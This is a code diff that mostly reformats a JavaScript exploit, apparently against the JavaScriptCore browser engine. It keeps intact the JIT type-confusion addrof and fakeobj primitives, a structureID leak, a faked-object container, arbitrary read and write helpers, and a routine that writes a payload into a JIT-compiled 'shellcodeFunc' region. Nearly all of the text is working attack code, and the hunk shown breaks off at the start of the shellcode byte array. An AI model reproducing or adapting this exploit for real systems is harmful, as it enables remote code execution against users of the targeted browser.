@@ -26,33 +26,26 @@ for (var i = 0; i < 0x1000; i++) {
 
 
 // address leak
-function addrofOnce(obj){
+function addrofOnce(obj) {
     var arr = [1.1, 2.2, 3.3];
     var confuse = new Array(1.1, 2.2, 3.3);
     confuse[0] = 1.1;
     let trigger = false;
     const b = new Base();
-    
     Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
     b.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = obj; return false;} });
-    
     function jitme(a, flag) {
         a[0] = 1.1;
         a[1] = 2.2;
-        if(flag) {
-            [...arr];
-        }
+        if (flag) [...arr];
         return a[1];
     }
-    for(var i = 0; i < 0x100000; i++){
-        jitme(confuse, false); // JITting...
-    }
+    for (var i = 0; i < 0x100000; i++) jitme(confuse, false);
     trigger = true;
     arr[0] = b.prototype;
     let addr = Int64.fromDouble(jitme(confuse, true));
     return addr;
 }
-
 
 function fakeobjOnce(addr){
     addr = Number(addr);
@@ -61,31 +54,19 @@ function fakeobjOnce(addr){
     confuse[1] = 1.1;
     let trigger = 0;
     const b2 = new Base();
-    
     Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
     b2.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = {}; return false; } });
-    
     function jitme(a, flag, f64arr, u32arr) {
         a[0] = 1.1;
         a[1] = 2.2;
-        if(flag) {
-            [...arr];
-        }
+        if (flag) [...arr];
         f64arr[0] = f64arr[1] = a[1];
-        // u32arr[3] = 1; //temp
-        // if(flag)
-        //     debug(u32[3])
         u32arr[2] = addr;
         a[1] = f64arr[1];
     }
-    
     let u32arr = new Uint32Array(4);
     let f64arr = new Float64Array(u32arr.buffer);
-    
-    for(var i = 0; i < 0x100000; i++){
-        jitme(confuse, false, f64arr, u32arr); // JITting...
-    }
-    
+    for (var i = 0; i < 0x100000; i++) jitme(confuse, false, f64arr, u32arr);
     trigger = 1;
     arr[0] = b2.prototype;
     jitme(confuse, true, f64arr, u32arr);
@@ -98,21 +79,15 @@ function addrofOnce2(obj){
     confuse[0] = 1.1;
     let trigger = false;
     const b = new Base();
-    
     Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
     b.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = obj; return false;} });
-    
     function jitme(a, flag) {
         a[0] = 1.1;
         a[1] = 2.2;
-        if(flag) {
-            [...arr];
-        }
+        if (flag) [...arr];
         return a[1];
     }
-    for(var i = 0; i < 0x100000; i++){
-        jitme(confuse, false); // JITting...
-    }
+    for (var i = 0; i < 0x100000; i++) jitme(confuse, false);
     trigger = true;
     arr[0] = b.prototype;
     let addr = Int64.fromDouble(jitme(confuse, true));
@@ -127,31 +102,19 @@ function fakeobjOnce2(addr){
     confuse[1] = 1.1;
     let trigger = 0;
     const b2 = new Base();
-    
     Object.defineProperty(arr, 0, {value:1.1, configurable:false, writable:true});
     b2.__defineGetter__("prototype", function() { if(trigger) { confuse[1] = {}; return false; } });
-    
     function jitme(a, flag, f64arr, u32arr) {
         a[0] = 1.1;
         a[1] = 2.2;
-        if(flag) {
-            [...arr];
-        }
+        if (flag) [...arr];
         f64arr[0] = f64arr[1] = a[1];
-        // u32arr[3] = 1; //temp
-        // if(flag)
-        //     debug(u32[3])
         u32arr[2] = addr;
         a[1] = f64arr[1];
     }
-    
     let u32arr = new Uint32Array(4);
     let f64arr = new Float64Array(u32arr.buffer);
-    
-    for(var i = 0; i < 0x100000; i++){
-        jitme(confuse, false, f64arr, u32arr); // JITting...
-    }
-    
+    for (var i = 0; i < 0x100000; i++) jitme(confuse, false, f64arr, u32arr);
     trigger = 1;
     arr[0] = b2.prototype;
     jitme(confuse, true, f64arr, u32arr);
@@ -202,71 +165,34 @@ function MakeJitCompiledFunction() {
         }
         return true;
     }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
-    for (var i = 0; i < 1000; i++) {
-        target(i);
-    }
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
+    for (var i = 0; i < 1000; i++) target(i);
     return target;
-}
-
-function millis(ms)
-{
-    var t1 = Date.now();
-    while(Date.now() - t1 < ms)
-    {
-        //Simply wait
-    }
 }
 
 var shellcodeFunc = MakeJitCompiledFunction();
 
 function pwn() {
-    
     let noCoW = 13.37;
     var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
     let structureID = LeakStructureID(arrLeak);
     log("[+] leak structureID: "+(structureID));
-    
     pad = [{}, {}, {}];
     var victim = [noCoW, 14.47, 15.57];
     victim['prop'] = 13.37;
     victim['prop_1'] = 13.37;
-    
     u32[0] = structureID;
     u32[1] = 0x01082309-0x20000;
-    
     var container = {
         cellHeader: f64[0],
         butterfly: victim
@@ -300,11 +226,6 @@ function pwn() {
         return f2i(unboxed[0]);
     }
     
-    function fakeobj(addr) {
-        unboxed[0] = i2f(addr);
-        return boxed[0];
-    }
-    
     function read64(addr) {
         driver[1] = i2f(addr+0x10);
         return addrof(victim.prop);
@@ -315,32 +236,23 @@ function pwn() {
         victim.prop = i2f(val);
     }
     
-    function ByteToDwordArray(payload) {
+    function ArbitraryWrite(addr, payload) {
         let sc = []
         let tmp = 0;
         let len = Math.ceil(payload.length/6)
         for (let i = 0; i < len; i += 1) {
             tmp = 0;
             pow = 1;
-            for(let j=0; j<6; j++){
+            for (let j=0; j<6; j++){
                 let c = payload[i*6+j]
-                if(c === undefined) {
-                    c = 0;
-                }
+                if (c === undefined) c = 0;
                 pow = j==0 ? 1 : 256 * pow;
                 tmp += c * pow;
             }
             tmp += 0xc000000000000;
             sc.push(tmp);
         }
-        return sc;
-    }
-    
-    function ArbitraryWrite(addr, payload) {
-        let sc = ByteToDwordArray(payload);
-        for(let i=0; i<sc.length; i++) {
-            write64(addr+i*6, sc[i]);
-        }
+        for (let i=0; i<sc.length; i++) write64(addr+i*6, sc[i]);
     }
     
     let arbCallBytes = new Uint8Array([
